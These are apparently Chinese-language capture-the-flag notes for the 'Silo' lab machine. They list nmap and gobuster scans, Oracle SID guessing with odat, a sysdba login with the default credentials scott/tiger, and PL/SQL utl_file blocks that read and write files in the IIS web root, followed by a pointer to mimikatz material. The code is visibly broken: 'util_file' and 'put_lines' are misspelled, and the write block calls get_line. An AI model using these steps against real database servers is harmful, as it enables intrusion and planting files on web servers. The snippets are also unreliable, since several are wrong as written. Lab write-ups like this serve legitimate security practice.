
# Silo

* 扫描
``` 
nmap -sC -sV -oA nmap/Slio 10.10.10.82

gobuster -u http://10.10.10.82 -w /usr/share/wordlists/dirbuster/directory.txt
```

* odat
> https://github.com/quentinhardy/odat   
clone之后按readme操作
``` 
./odat.py sidgueseer -s 10.10.10.82 -p 1521
```

* sqlplus64
``` 
sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba
   
```
Oracle命令行执行
``` 
# 命令一
> declare 
>   f utl_file.file_type;
>   s varchar(200);
> begin
>   f := util_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
>   utl_file.get_line(f,s);
>   utl_file.fclose(f);
>   dbms_output.put_lines(s);
> end;

# 命令二
> declare 
>   f utl_file.file_type;
>   s varchar(5000) := 'Please Subscribe';
> begin
>   f := util_file.fopen('/inetpub/wwwroot', 'helloworld.txt', 'W');
>   utl_file.get_line(f,s);
>   utl_file.fclose(f);
>   dbms_output.put_lines(s);
> end;
```

* mimikatz volatility
> https://www.computersecuritystudent.com/FORENSICS/LosBuntu/lesson4/index.html


